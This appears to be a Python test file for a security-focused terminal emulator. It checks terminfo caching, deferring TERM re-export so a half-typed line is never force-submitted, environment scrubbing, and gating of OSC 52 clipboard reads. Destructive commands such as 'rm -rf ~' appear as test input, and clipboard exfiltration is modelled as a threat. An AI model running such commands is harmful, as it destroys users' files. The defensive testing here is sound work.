    eq(_renders_to('abc\bX', _le), 'abX',
       '%s honours backspace whatever line_edits says' % _entry)

# 4. The -noedit entry may only ever be a SUBSET: it exists to cancel caps, so a
# capability it advertises that the full entry does not is drift, not intent.
eq(sorted(set(_CAPS_NOEDIT) - set(_CAPS_EDIT)), [],
   'the append-only entry advertises nothing the full entry does not')

# 5. CLASH between the shipped source and the COMPILED artifact: cli_terminfo_dir
# caches the compilation, so a cache that outlives a changed .ti keeps advertising
# the old capability set to every shell -- the renderer moves on, the promise does
# not. (Found the hard way: a cache predating the -noedit entry made this very
# audit read a capability set that no longer existed in the source.)
# Isolated cache: the probe writes a BOGUS compiled entry, which must never be
# left where a later test (or a real shell) could read it as terminfo.
import tempfile as _tf                                              # noqa: E402
import shutil as _shutil                                            # noqa: E402
_prev_cache = os.environ.get('XDG_CACHE_HOME')
_tmpcache = _tf.mkdtemp(prefix='st-terminfo-')
os.environ['XDG_CACHE_HOME'] = _tmpcache
_stale = os.path.join(_tmpcache, 'secure-terminal', 'terminfo')
os.makedirs(os.path.join(_stale, 's'), exist_ok=True)
_stale_file = os.path.join(_stale, 's', 'secure-terminal')
# BOTH entries are written, so the cache is complete and only its AGE can reject
# it -- otherwise this would re-test the both-entries rule and never reach the
# mtime comparison at all.
_stale_files = [_stale_file, os.path.join(_stale, 's', 'secure-terminal-noedit')]


def _write_stale(offset):
    for _p in _stale_files:
        with open(_p, 'wb') as _fh:
            _fh.write(b'stale')
        os.utime(_p, (os.path.getmtime(_ti) + offset,
                      os.path.getmtime(_ti) + offset))


_write_stale(-60)
_got_dir = _timod.cli_terminfo_dir()
ok(_got_dir is not None, 'a stale cache still yields a terminfo dir')
with open(os.path.join(_got_dir, 's', 'secure-terminal'), 'rb') as _sfh:
    _compiled = _sfh.read()
ok(_compiled != b'stale',
   'a compiled entry older than the .ti source is RECOMPILED, not served stale')
# the recompilation is a real, complete one: BOTH entries resolve from it
eq(_sp.run(['tput', '-T', 'secure-terminal-noedit', 'cub1'],
           env=dict(os.environ, TERMINFO=_got_dir), check=False,
           capture_output=True, timeout=15).returncode, 0,
   'the refreshed compilation carries the append-only entry too')
# ...and a cache NEWER than the source is served as-is (no needless recompile)
_write_stale(+60)
eq(_timod.cli_terminfo_dir(), _stale,
   'a compiled entry newer than the source is served from cache')
if _prev_cache is None:
    del os.environ['XDG_CACHE_HOME']
else:
    os.environ['XDG_CACHE_HOME'] = _prev_cache
_shutil.rmtree(_tmpcache, ignore_errors=True)
# end-to-end: a CLI-mode child actually sees TERM=secure-terminal
_te = SecureTerminal(command=['sh', '-c', 'printf T=$TERM'])
_ebuf = b''
_estart = _time.monotonic()
import fcntl as _fcntl2                                             # noqa: E402
_fcntl2.fcntl(_te._fd, _fcntl2.F_SETFL,
              _fcntl2.fcntl(_te._fd, _fcntl2.F_GETFL) | os.O_NONBLOCK)
while _time.monotonic() - _estart < 1.5:
    import select as _sel2
    _r, _, _ = _sel2.select([_te._fd], [], [], 0.05)
    if _te._fd in _r:
        try:
            _chunk = os.read(_te._fd, 4096)
        except OSError:
            break
        if not _chunk:
            break
        _ebuf += _chunk
        if b'T=' in _ebuf:
            break
_te.close()
ok(b'T=secure-terminal' in _ebuf, 'the child process actually gets TERM=secure-terminal')


def _child_term_env(term):
    """Read back what the child's TERM actually was. The ctor FORKS, so this is the
    only assertion that catches a line_edits value applied too late -- _child_term()
    is evaluated lazily and would report the post-fork value either way."""
    buf = b''
    _fcntl2.fcntl(term._fd, _fcntl2.F_SETFL,
                  _fcntl2.fcntl(term._fd, _fcntl2.F_GETFL) | os.O_NONBLOCK)
    import select as _sel3                                          # noqa: E402
    start = _time.monotonic()
    while _time.monotonic() - start < 1.5:
        _r, _, _ = _sel3.select([term._fd], [], [], 0.05)
        if term._fd not in _r:
            continue
        try:
            chunk = os.read(term._fd, 4096)
        except OSError:
            break
        if not chunk:
            break
        buf += chunk
        if b'T=' in buf:
            break
    return buf


# The window's line_edits default must reach the CTOR, which is what forks: applied
# afterwards via apply_line_edits it leaves the already-forked shell advertising
# el/cuf/hpa, so the opt-out changed only the display and completion still garbled.
_saved_dle = win._default_line_edits
_probe_cmd = ['sh', '-c', 'printf T=$TERM']
win._default_line_edits = False
win.new_tab(command=_probe_cmd)
ok(b'T=secure-terminal-noedit' in _child_term_env(win.current()),
   'new_tab forks the child with the append-only terminfo entry')
win._default_line_edits = True
win.new_tab(command=_probe_cmd)
_dfl_term = _child_term_env(win.current())
ok(b'T=secure-terminal' in _dfl_term and b'-noedit' not in _dfl_term,
   'line editing on (the default) forks with the normal CLI entry')
win._default_line_edits = _saved_dle
# a --no-line-edits launch spec must reach the ctor for the same reason
win._open_launch_tab({'command': _probe_cmd, 'line_edits': False})
ok(b'T=secure-terminal-noedit' in _child_term_env(win.current()),
   'a --no-line-edits launch spec forks the child with the append-only entry')

# CLI<->TUI toggle re-exports TERM for the new mode into the RUNNING shell (no
# restart, state preserved), and is REFUSED with an advisory while a program owns
# the terminal -- its terminfo cannot be changed under it (#63). command=None: the
# re-export only fires for the DEFAULT login shell, so this needs a shell tab.
_tg = SecureTerminal(command=None)
_tgadv = []
_tg.advise_signal.connect(_tgadv.append)
_tgsent = spy_writes(_tg)
_tg.has_foreground_program = lambda: True             # a program is running
ok(_tg.apply_tui(True) is False and _tg._tui is False,
   'apply_tui is refused while a program is running')
ok(any('shell prompt' in a for a in _tgadv),
   'the refusal advises switching at a shell prompt')
ok(_tgsent == [], 'a refused switch writes nothing to the shell')
_tg.has_foreground_program = lambda: False            # at a prompt now
ok(_tg.apply_tui(True) is True and _tg._tui is True,
   'apply_tui switches to TUI at a shell prompt')
# CR (\r), not \n: zsh's zle binds accept-line to CR, so \n would leave the
# re-export unsubmitted at the prompt (regression: TUI->CLI "not auto sent").
ok(b'export TERM=xterm-256color\r' in _tgsent,
   'CLI->TUI re-exports the full terminfo to the running shell, CR-terminated')
ok(not any(b'export TERM=xterm-256color\n' in s for s in _tgsent),
   'the re-export is NOT \\n-terminated (would not submit under zle)')
_tgsent.clear()
_tg.apply_tui(False)
ok(b'export TERM=secure-terminal\r' in _tgsent,
   'TUI->CLI re-exports the restricted terminfo to the running shell, CR-terminated')
_tg.close()

# A tab launched with `-- PROGRAM` runs that program as _pid, which
# has_foreground_program cannot tell from a bare shell, so the re-export is SKIPPED
# there -- else `export TERM=...` would be typed into the program (ai-review P1).
_tgc = SecureTerminal(command='/bin/cat')
_tgcsent = spy_writes(_tgc)
_tgc.has_foreground_program = lambda: False            # looks like "a prompt"
ok(_tgc.apply_tui(True) is True and _tgc._tui is True,
   'apply_tui still switches mode for a command tab')
ok(not any(b'export TERM=' in s for s in _tgcsent),
   'a command tab (command != None) never re-exports TERM into the program')
_tgc.close()

# --- a pending line DEFERS the re-export (pty injection) -----------------------
# `export TERM=...` is TYPED INPUT terminated by CR, so sending it while the user
# has a half-typed line makes the shell receive `<pending>export TERM=...` and RUN
# it -- an Enter nobody pressed, submitting their unfinished text. Verified against
# a real bash on a real pty: a pending `echo mark$((6*7))` came back as
# `mark42 export TERM=xterm-256color`. So: hold the re-export until the prompt is
# clear -- and never kill the line to make room, because discarding what someone
# typed is not ours to do.
_tgp = SecureTerminal(command=None)
_tgpadv = []
_tgp.advise_signal.connect(_tgpadv.append)
_tgpsent = spy_writes(_tgp)
_tgp.has_foreground_program = lambda: False            # at a shell prompt
_tgp._line_buffer = 'rm -rf ~/important'               # half-typed, no Enter yet
ok(_tgp.apply_tui(True) is True and _tgp._tui is True,
   'the display still switches while a line is pending')
ok(_tgpsent == [],
   'a pending line defers the re-export: nothing is typed into the shell')
ok(not any(b'\r' in s for s in _tgpsent),
   'no accept-line reaches the shell, so the pending line is never force-submitted')
eq(_tgp._line_buffer, 'rm -rf ~/important',
   'the half-typed line is left intact (never killed to make room)')
ok(any('submitted or cleared' in a for a in _tgpadv),
   'the deferral is advised, not silent')
# It must still LAND once the prompt clears, or the live switch is merely broken.
# The terminal is in TUI mode now, where the line is not mirrored -- the accept-line
# keys still have to release the deferral, else it would wait forever.
key(_tgp, Qt.Key.Key_Return)                           # submits, clearing the prompt
ok(_tgp._line_buffer == '' and not _tgp._line_dirty,
   'accept-line in TUI mode releases the deferred re-export')
_tgpsent.clear()                                       # drop the CR itself
feed_output(_tgp, b'prompt$ ')                         # a returning prompt is the cue
ok(any(b'export TERM=xterm-256color\r' == s for s in _tgpsent),
   'the deferred re-export is sent once the line is clear')
ok(not getattr(_tgp, '_reexport_pending', False),
   'the deferral is cleared after it is sent')
_tgp.close()

# The same hazard with an INVISIBLE line: a history recall (Up) rewrites the real
# shell line without going through _line_buffer, so the buffer reads empty while
# the prompt is actually full. _line_dirty is what records "we cannot see this
# line" -- a line we cannot see is exactly the line a CR-terminated re-export must
# not be typed into.
_tgd = SecureTerminal(command=None)
_tgdsent = spy_writes(_tgd)
_tgd.has_foreground_program = lambda: False
key(_tgd, Qt.Key.Key_Up)                               # recall a previous command
ok(_tgd._line_dirty and _tgd._line_buffer == '',
   'history recall marks the line unmirrored')
_tgdsent.clear()                                       # drop the arrow sequence
_tgd.apply_tui(True)
ok(_tgdsent == [],
   'a recalled (unmirrored) line defers the re-export too')
_tgd.close()

# The same hazard reached from TUImode. TUI never mirrors the shell's line, so
# text typed at a BARE prompt (no foreground program) touches neither _line_buffer
# nor -- until now -- _line_dirty. Left unflagged, a TUI->CLI switch fired an
# immediate CR-terminated re-export that concatenated onto and SUBMITTED that
# typed line: an Enter nobody pressed. So a TUI keystroke at a bare prompt marks
# the line dirty, and the switch defers exactly like a mirrored CLI line.
_tt = SecureTerminal(command=None, tui=True)
_ttsent = spy_writes(_tt)
_tt.has_foreground_program = lambda: False              # bare shell prompt
key(_tt, Qt.Key.Key_L, 'l')                             # type `ls` at the TUI prompt
key(_tt, Qt.Key.Key_S, 's')
ok(_tt._line_dirty and _tt._line_buffer == '',
   'typing at a bare TUI prompt marks the line dirty (the buffer stays unmirrored)')
ok(_tt._line_pending(),
   '_line_pending() sees the TUI-typed line, so a re-export must wait for it')
_ttsent.clear()
_tt.apply_tui(False)                                    # flip TUI -> CLI
ok(_ttsent == [],
   'the TUI-typed line defers the re-export: nothing is typed into the shell')
ok(not any(b'\r' in s for s in _ttsent),
   'no CR is generated, so the typed line is never force-submitted')
# It must still LAND once the prompt clears, or the switch is merely broken. The
# tab is in CLI mode now; submitting the line releases the deferral.
key(_tt, Qt.Key.Key_Return)                             # user submits -> prompt clears
_ttsent.clear()                                         # drop the CR itself
feed_output(_tt, b'prompt$ ')                           # a returning prompt is the cue
ok(any(b'export TERM=secure-terminal\r' == s for s in _ttsent),
   'the deferred re-export lands once the TUI-typed line is submitted')
_tt.close()

# A history recall (Up) at a bare TUI prompt is the same hazard with an INVISIBLE
# line -- it marks dirty too (covers the mapped-key path, not just printable text).
_th = SecureTerminal(command=None, tui=True)
spy_writes(_th)                                         # sink the writes; not inspected
_th.has_foreground_program = lambda: False
key(_th, Qt.Key.Key_Up)                                 # recall a previous command
ok(_th._line_dirty,
   'history recall at a bare TUI prompt marks the line unmirrored')
_th.close()

# But keys consumed by a FOREGROUND PROGRAM must NOT mark the line: a program that
# exits without an accept-line key (e.g. `less` quit with `q`) would otherwise
# strand the flag and defer the re-export forever.
_tp = SecureTerminal(command=None, tui=True)
_tpsent = spy_writes(_tp)
_tp.has_foreground_program = lambda: True               # a full-screen program owns it
_tp._line_dirty = False
key(_tp, Qt.Key.Key_Q, 'q')                             # e.g. `q` to quit less
ok(not _tp._line_dirty,
   'a keystroke into a running program does not mark the line (no stranded defer)')
# and because it was never stranded, once the program exits the switch re-exports
# immediately instead of deferring on a phantom pending line.
_tp.has_foreground_program = lambda: False              # program exited -> bare prompt
_tp.apply_tui(False)
ok(any(b'export TERM=secure-terminal\r' == s for s in _tpsent),
   'once the program exits, the switch re-exports immediately (nothing stranded)')
_tp.close()

# A bare shell prompt in TUI mode still submits real commands: switching to TUI,
# typing a command, and pressing Enter has to submit and settle the line. An empty
# prompt submits with nothing to reset; a program owning the terminal receives the
# accept-line directly.
_thk = SecureTerminal(command=None, tui=True)
_thksent = spy_writes(_thk)
_thk.has_foreground_program = lambda: False
_thk._line_dirty = False
_thk._line_buffer = ''
key(_thk, Qt.Key.Key_Return)
ok(b'\r' in _thksent,
   'an empty TUI prompt submits normally on accept-line')
# while a foreground program owns the terminal, accept-line goes to IT
_thksent.clear()
_thk.has_foreground_program = lambda: True
key(_thk, Qt.Key.Key_Return)
ok(b'\r' in _thksent,
   'a program owning the terminal receives accept-line directly')
_thk.close()

# A paste at a bare TUI shell prompt is a command the next Enter submits, so it must
# mark the line unverifiable too, keeping _line_pending() aware the prompt is held.
_tpp = SecureTerminal(command=None, tui=True)
spy_writes(_tpp)
_tpp.has_foreground_program = lambda: False
_tpp._line_dirty = False
_tpp._dispatch_paste('rm -rf ~', 'unicode')             # paste at a bare TUI prompt
ok(_tpp._line_dirty,
   'a paste at a bare TUI prompt marks the line unverifiable')
_tpp.has_foreground_program = lambda: True               # a program owns the terminal
_tpp._line_dirty = False
_tpp._dispatch_paste('data', 'unicode')                  # paste is the program's data
ok(not _tpp._line_dirty,
   'a paste delivered to a foreground TUI program does not mark the line')
_tpp.close()

# A CLI-typed line carried into TUI stays in _line_buffer; editing it there with a
# key TUI cannot mirror (Backspace/Home/Delete) desyncs the buffer from the real
# shell line, so it must invalidate the buffer -- keeping _line_pending() honest so
# a CR-terminated re-export is not typed onto the edited line.
_tce = SecureTerminal(command=None, tui=True)
spy_writes(_tce)
_tce.has_foreground_program = lambda: False
_tce._line_buffer = '#rm -rf ~'                          # carried CLI line, commented
_tce._line_dirty = False
key(_tce, Qt.Key.Key_Backspace)                          # edit it in TUI (delete the #)
ok(_tce._line_dirty,
   'a TUI edit of a carried CLI line invalidates the stale buffer')
_tce.close()

# A no-op key at an EMPTY bare TUI prompt introduces no content, so it must NOT
# flag the line pending -- else the TUI->CLI switch would needlessly defer the
# re-export at a clean prompt, leaving TERM stale for the next command. Pure
# navigation (Left/Home/...) and deletion (Backspace/Delete) can only ACT on
# content a content-introducing key already flagged.
_tn = SecureTerminal(command=None, tui=True)
_tnsent = spy_writes(_tn)
_tn.has_foreground_program = lambda: False
key(_tn, Qt.Key.Key_Backspace)                          # no-op at an empty prompt
key(_tn, Qt.Key.Key_Left)                               # pure cursor move
ok(not _tn._line_dirty and not _tn._line_pending(),
   'navigation/deletion at an empty TUI prompt does not flag the line pending')
_tnsent.clear()
_tn.apply_tui(False)                                    # flip TUI -> CLI
ok(any(b'export TERM=secure-terminal\r' == s for s in _tnsent),
   'a clean prompt re-exports immediately -- no needless deferral for no-op keys')
_tn.close()

# The discard branch requires `not shift`, matching the control-byte branch below
# it: Ctrl+Shift+C is a copy shortcut, not a discard, so it must NOT clear the line.
# (The window filters Ctrl+Shift before _tui_key; this keeps the two branches self-
# consistent, so a clear can never fire without the matching byte being sent.)
_ts = SecureTerminal(command=None, tui=True)
spy_writes(_ts)
_ts.has_foreground_program = lambda: False
_ts._line_buffer = 'held'
_ts._tui_key(QKeyEvent(QEvent.Type.KeyPress, Qt.Key.Key_C,
                       Qt.KeyboardModifier.ControlModifier
                       | Qt.KeyboardModifier.ShiftModifier, ''))
ok(_ts._line_buffer == 'held',
   'Ctrl+Shift+C does not clear the line in _tui_key (it is not a discard)')
_ts.close()

# Toggling line editing live must re-export TERM too, not only re-render: the
# renderer stops honouring el/cuf/hpa, so a shell still told they work keeps
# emitting redraws that vanish (a mangled completion). Same reachability guard as
# the CLI/TUI switch.
_lex = SecureTerminal(command=None)
_lexadv = []
_lex.advise_signal.connect(_lexadv.append)
_lexsent = spy_writes(_lex)
_lex.has_foreground_program = lambda: False           # at a shell prompt
_lex.apply_line_edits(False)
ok(b'export TERM=secure-terminal-noedit\r' in _lexsent,
   'line editing off re-exports the append-only terminfo entry, CR-terminated')
_lexsent.clear()
_lex.apply_line_edits(True)
ok(b'export TERM=secure-terminal\r' in _lexsent,
   'line editing back on re-exports the normal CLI terminfo entry')
_lexsent.clear()
_lex.has_foreground_program = lambda: True            # a program owns the terminal
_lex.apply_line_edits(False)
ok(_lex.line_edits_enabled() is False,
   'the display change still applies while a program is running')
ok(_lexsent == [], 'no export is typed into a running program')
ok(any('shell prompt' in a for a in _lexadv),
   'the unreachable re-export is advised, not silent')
_lex.close()

# TUI advertises xterm-256color either way, so a line-edits toggle there must not
# write a pointless export into the shell.
_lext = SecureTerminal(command=None, tui=True)
_lextsent = spy_writes(_lext)
_lext.has_foreground_program = lambda: False
_lext.apply_line_edits(False)
ok(_lextsent == [], 'a line-edits toggle in TUI mode re-exports nothing')
_lext.close()


# #93: has_foreground_program / terminate distinguish a LOGIN shell's bare prompt
# (its child IS the shell -> nothing to terminate) from a `-- PROGRAM` tab (its
# child IS the program -- nano, htop -- to terminate). Force "the child is in the
# foreground" (fg pgrp == _pid) and flip _command to read it both ways, so one
# lightweight tab exercises all four branches deterministically.
import os as _os93                                       # noqa: E402
_fgt = SecureTerminal(command='/bin/cat')                # command tab: _command set
# pty.fork() runs the child's setsid() asynchronously; until it completes the
# child briefly shares OUR process group, which terminate's self-kill guard
# (correctly) refuses to signal. A real user never terminates in that microsecond
# window -- wait for the child to settle into its own session before probing.
for _ in range(200):
    try:
        if _os93.getpgid(_fgt._pid) != _os93.getpgrp():
            break
    except OSError:
        break
    pump(10)
_fgt._foreground_pgrp = lambda: _os93.getpgid(_fgt._pid)
ok(_fgt.has_foreground_program(),
   '#93: a `-- PROGRAM` tab whose program is in the foreground is terminable')
_fgt._command = None                                     # read as a login shell at its prompt
ok(not _fgt.has_foreground_program(),
   '#93: a login shell at its bare prompt is not terminable')
ok(not _fgt.terminate_foreground(),
   '#93: terminate is a no-op at a login-shell bare prompt')
_fgt._command = '/bin/cat'                               # a command tab again
ok(_fgt.terminate_foreground(), '#93: terminate acts on a command-tab program')
_fgt.close()

# #93 (ai-review F5): getpgid races the child's death -- if the child exits between
# the enable-poll and the click, terminate_foreground must treat it as gone (no-op),
# not raise ProcessLookupError out of the slot (as has_foreground_program does).
_ogpg93 = _os93.getpgid
_os93.getpgid = lambda _p: (_ for _ in ()).throw(ProcessLookupError())
try:
    _fgd = SecureTerminal(command='/bin/cat')
    _fgd._command = None
    _fgd._pid = 999999
    _fgd._foreground_pgrp = lambda: 424242          # non-None, not our own group
    ok(not _fgd.terminate_foreground(),
       '#93: terminate is a no-op when getpgid races the child death (no exception)')
    _fgd.close()
finally:
    _os93.getpgid = _ogpg93

# --- truecolour / 256-colour rendering (CLI line mode) ------------------------
_tc = SecureTerminal(command='/bin/cat')
eq(_tc._format_for({'fg': '#ff6400', 'bg': None, 'bold': False}).foreground().color().name(),
   '#ff6400', 'CLI renders a 24-bit truecolour fg')
ok(_tc._format_for({'fg': 3, 'bg': None, 'bold': False}).foreground().color().isValid(),
   'CLI still renders a 16-colour palette fg')
ok(_tc._format_for({'fg': '#123456', 'bg': '#123456', 'bold': False})
   .foreground().color().name() != '#123456',
   'the contrast guard forces a readable fg even when a truecolour fg == bg')
# a STRUCTURAL block/half-block glyph keeps BOTH its truecolour fg and bg: the readability
# guard is skipped for it, because its deliberately near-equal fg/bg are the two pixels of a
# colour ramp, not hidden text. Without this a half-block gradient renders banded (bg dropped).
_bfmt = _tc._format_for({'fg': '#c0c0c0', 'bg': '#b4b4b4', 'bold': False}, structural=True)
eq(_bfmt.background().color().name(), '#b4b4b4',
   'a structural glyph keeps its truecolour bg (contrast guard skipped)')
eq(_bfmt.foreground().color().name(), '#c0c0c0',
   'a structural glyph keeps its truecolour fg (contrast guard skipped)')
ok(_tc._format_for({'fg': '#c0c0c0', 'bg': '#b4b4b4', 'bold': False})
   .foreground().color().name() != '#c0c0c0',
   'the contrast guard STILL fires for a non-structural near-equal fg/bg')
_tc.close()
# a child sees COLORTERM=truecolor (we render it faithfully, so we advertise it)
_cte = SecureTerminal(command=['sh', '-c', 'printf C=$COLORTERM,CTEND'])
_cbuf = b''
_cs = _time.monotonic()
_fcntl2.fcntl(_cte._fd, _fcntl2.F_SETFL,
              _fcntl2.fcntl(_cte._fd, _fcntl2.F_GETFL) | os.O_NONBLOCK)
while _time.monotonic() - _cs < 1.5:
    import select as _sel3
    _rr, _, _ = _sel3.select([_cte._fd], [], [], 0.05)
    if _cte._fd in _rr:
        try:
            _ck = os.read(_cte._fd, 4096)
        except OSError:
            break
        if not _ck:
            break
        _cbuf += _ck
        if b'CTEND' in _cbuf:              # distinct terminator, not the C= prefix
            break
_cte.close()
ok(b'C=truecolor' in _cbuf, 'the child gets COLORTERM=truecolor')


# --- child environment scrub (fingerprint vars, LINES/COLUMNS, PAGER default) --
def _child_env_out(cmd, needle, secs=1.5):
    """Spawn a CLI child running `cmd`, read its raw output until `needle` (bytes)
    or `secs` elapse, return the bytes -- asserts what the child actually inherits."""
    import select as _selce
    _t = SecureTerminal(command=cmd)
    _fcntl2.fcntl(_t._fd, _fcntl2.F_SETFL,
                  _fcntl2.fcntl(_t._fd, _fcntl2.F_GETFL) | os.O_NONBLOCK)
    _b = b''
    _s = _time.monotonic()
    while _time.monotonic() - _s < secs:
        _rr, _, _ = _selce.select([_t._fd], [], [], 0.05)
        if _t._fd in _rr:
            try:
                _c = os.read(_t._fd, 4096)
            except OSError:
                break
            if not _c:
                break
            _b += _c
            if needle in _b:
                break
    _t.close()
    return _b


# preload every fingerprint var terminal.py drops + a stale LINES/COLUMNS, so any
# leak is visible in the child's `env`
_fp_vars = ('TERM_PROGRAM', 'TERM_PROGRAM_VERSION', 'VTE_VERSION',
            'KONSOLE_VERSION', 'KONSOLE_DBUS_SERVICE', 'KONSOLE_DBUS_SESSION',
            'WT_SESSION', 'WT_PROFILE_ID', 'ITERM_SESSION_ID', 'ITERM_PROFILE',
            'KITTY_WINDOW_ID', 'KITTY_PID', 'ALACRITTY_WINDOW_ID')
for _fv in _fp_vars:
    os.environ[_fv] = 'leak-' + _fv
os.environ['LINES'] = '99'
os.environ['COLUMNS'] = '222'
# leading newline so a first-line var is matched by the "\nNAME=" test too
_envout = b'\n' + _child_env_out(['sh', '-c', 'env; printf ENVEND'], b'ENVEND')
for _fv in _fp_vars:
    ok(('\n' + _fv + '=').encode() not in _envout,
       'child does not inherit fingerprint var ' + _fv)
ok(b'\nLINES=' not in _envout,
   'child does not inherit a stale LINES (real size comes from TIOCSWINSZ)')
ok(b'\nCOLUMNS=' not in _envout, 'child does not inherit a stale COLUMNS')
for _fv in _fp_vars + ('LINES', 'COLUMNS'):
    os.environ.pop(_fv, None)
# PAGER defaults to cat when the parent set none; a distinct terminator (not the
# P= prefix of the expected value) so a split read cannot break the loop early
os.environ.pop('PAGER', None)
_pgr = _child_env_out(['sh', '-c', 'printf P=$PAGER,PGREND'], b'PGREND')
ok(b'P=cat,' in _pgr, 'the child gets PAGER=cat by default')

# --- synchronized output (DECSET 2026): hold the paint between begin/end ------
_sy = SecureTerminal(command='/bin/cat', tui=True)
_sy._make_screen()
_sy._render_timer.stop()
feed_output(_sy, b'\x1b[?2026h')
ok(_sy._sync_update and not _sy._render_timer.isActive(),
   'DECSET 2026 begin holds the paint (pyte still fed)')
feed_output(_sy, b'half a frame')
ok(_sy._sync_update and not _sy._render_timer.isActive(),
   'the paint stays held during a synchronized update')
feed_output(_sy, b'\x1b[?2026l')
ok(not _sy._sync_update, 'DECSET 2026 end releases the hold')
feed_output(_sy, b'\x1b[?2026h')
_sy._end_sync_update()                     # simulate the watchdog firing
ok(not _sy._sync_update, 'an unclosed synchronized update is bounded (watchdog)')
_sy.close()

# a pending 16ms paint is cancelled when a synchronized update begins (no partial)
_sy2 = SecureTerminal(command='/bin/cat', tui=True)
_sy2._make_screen()
_sy2._render_timer.start(16)               # arm a pending paint
feed_output(_sy2, b'\x1b[?2026h')
ok(_sy2._sync_update and not _sy2._render_timer.isActive(),
   'entering a synchronized update cancels a pending partial paint')
# a ?2026 marker split across two reads is still detected (boundary carry)
_sy2._end_sync_update()
feed_output(_sy2, b'\x1b[?202')            # first half of the begin marker
feed_output(_sy2, b'6h')                   # second half in the next read
ok(_sy2._sync_update, 'a ?2026h begin split across reads is still detected')
feed_output(_sy2, b'\x1b[?2026l')
ok(not _sy2._sync_update, 'and the matching end too')
# a repeated begin while already held must NOT re-arm the watchdog (no indefinite hold)
_starts = []
_sy2._sync_timer.start = lambda *a: _starts.append(1)   # count re-arms
feed_output(_sy2, b'\x1b[?2026h')          # enter -> arm once
feed_output(_sy2, b'\x1b[?2026h')          # repeat while held -> must not re-arm
eq(len(_starts), 1, 'a repeated ?2026h while held does not re-arm the watchdog')
# but an END-then-BEGIN in one read is a NEW frame -> the watchdog IS restarted
feed_output(_sy2, b'\x1b[?2026l\x1b[?2026h')
eq(len(_starts), 2, 'an end-then-begin in one read restarts the watchdog (new frame)')
_sy2.close()

# There is no gated OSC colour-query write-back: no terminal-side signal
# (alt-screen, ICANON) reliably distinguishes a legit query consumer from injection
# at a shell prompt -- a background job or a cat'd file emitting ?1049h defeats any
# such gate. The absolute "output never writes to the pty" closure holds instead;
# every query, colour included, stays unanswered (see the reflection oracle below).

# --- OSC 52 clipboard READ: opt-in, ask-once-per-tab, the ONE write-back -------
from PyQt6.QtGui import QGuiApplication as _QGA                     # noqa: E402
_QGA.clipboard().setText('clip-secret')


def _clip_read(feature_on, grant):
    c = SecureTerminal(command='/bin/cat', tui=True)
    c.apply_osc('osc_clipboard_read', feature_on)
    _reqs = []
    c.clipboard_read_requested.connect(lambda: _reqs.append(1))
    _sent = []
    c._write = _sent.append                # pylint: disable=protected-access
    if grant is not None:
        # A tab that ALREADY carries a persistent decision (allow-always / deny-always)
        # from an earlier dialog: a later read reads _clipboard_read directly, it does
        # not reopen a dialog. grant_clipboard_read ONLY resolves a live 'pending' dialog
        # (a late click on an abandoned one is dropped), so model the standing decision
        # as the persisted state, not a fresh grant.
        c._clipboard_read = bool(grant)
    c._handle_osc(b'\x1b]52;c;?\x07')
    c.close()
    return _reqs, _sent


_rq, _st = _clip_read(False, None)
eq(_st, [], 'OSC 52 read: feature off -> no reply')
eq(len(_rq), 0, 'OSC 52 read: feature off -> no dialog asked')
_rq, _st = _clip_read(True, None)
eq(_st, [], 'OSC 52 read: enabled but tab undecided -> NO reply (only asks once)')
eq(len(_rq), 1, 'OSC 52 read: enabled + undecided -> the ask-once-per-tab dialog is raised')
_rq, _st = _clip_read(True, False)
eq(_st, [], 'OSC 52 read: tab denied -> no reply, no re-ask')
eq(len(_rq), 0, 'OSC 52 read: a denied tab is not re-asked')
_rq, _st = _clip_read(True, True)
ok(len(_st) == 1 and _st[0].startswith(b'\x1b]52;c;'),
   'OSC 52 read: enabled + tab granted -> the clipboard is answered')
import base64 as _b64                                              # noqa: E402
eq(_b64.b64decode(_st[0].split(b';', 2)[2].rstrip(b'\x07')), b'clip-secret',
   'OSC 52 read: the reply carries the clipboard, base64-encoded')
# base64-ONLY: the reply body carries no newline or control byte, so a granted read
# cannot smuggle an injection onto the program's stdin.
import re as _re_clip                                              # noqa: E402
_clipbody = _st[0].split(b';', 2)[2].rstrip(b'\x07')
ok(_re_clip.fullmatch(rb'[A-Za-z0-9+/]*={0,2}', _clipbody) is not None,
   'OSC 52 read: the reply body is base64-only (no control/newline reaches stdin)')
# SIZE-CAPPED: an oversized clipboard is truncated to _OSC_CLIP_MAX before encoding,
# so a granted program cannot pull an unbounded read off the clipboard.
from secure_terminal.terminal import _OSC_CLIP_MAX as _CLIPMAX    # noqa: E402
_QGA.clipboard().setText('A' * (_CLIPMAX + 5000))
_rqc, _stc = _clip_read(True, True)
ok(len(_stc) == 1, 'OSC 52 read: an oversized clipboard still yields exactly one reply')
eq(len(_b64.b64decode(_stc[0].split(b';', 2)[2].rstrip(b'\x07'))), _CLIPMAX,
   'OSC 52 read: the clipboard reply is size-capped at _OSC_CLIP_MAX')
_QGA.clipboard().setText('clip-secret')       # restore for later readers
# rate-limited: a granted tab cannot be flood-exfiltrated
_cg = SecureTerminal(command='/bin/cat', tui=True)
_cg.apply_osc('osc_clipboard_read', True)
_cg._clipboard_read = True                 # a tab already granted allow-always
_cgs = []
_cg._write = _cgs.append
_cg._handle_osc(b'\x1b]52;c;?\x07')
_cg._handle_osc(b'\x1b]52;c;?\x07')
eq(len(_cgs), 1, 'OSC 52 read: two reads in a granted tab -> one reply (rate-limited)')
_cg.close()
# granting a PENDING request answers the query that opened the dialog (codex F1)
_cp = SecureTerminal(command='/bin/cat', tui=True)
_cp.apply_osc('osc_clipboard_read', True)
_cps = []
_cp._write = _cps.append
_cp._handle_osc(b'\x1b]52;c;?\x07')        # -> pending, dialog asked, no reply yet
eq(_cps, [], 'a pending clipboard request sends no reply until the user decides')
_cp.grant_clipboard_read(_cp.CLIP_ALLOW_ALWAYS)   # user allows -> the pending query is answered NOW
ok(len(_cps) == 1 and _cps[0].startswith(b'\x1b]52;c;'),
   'granting a pending request answers the query that opened the dialog')
_cp.close()

# --- OSC 52 read: the four dialog decisions (allow/deny x once/always) ---------
def _clip_term():
    c = SecureTerminal(command='/bin/cat', tui=True)
    c.apply_osc('osc_clipboard_read', True)
    reqs, sent = [], []
    c.clipboard_read_requested.connect(lambda: reqs.append(1))
    c._write = sent.append                 # pylint: disable=protected-access
    return c, reqs, sent


def _clip_ask(c):
    c._last_clip_read = 0.0                 # clear the rate-limit gate for the test
    c._handle_osc(b'\x1b]52;c;?\x07')

# allow-once: answers THIS request, but does NOT remember -> the next read re-asks
_co, _cor, _cos = _clip_term()
_clip_ask(_co)
_co.grant_clipboard_read(_co.CLIP_ALLOW_ONCE)
eq(len(_cos), 1, 'OSC 52 read: allow-once answers the pending request')
_clip_ask(_co)
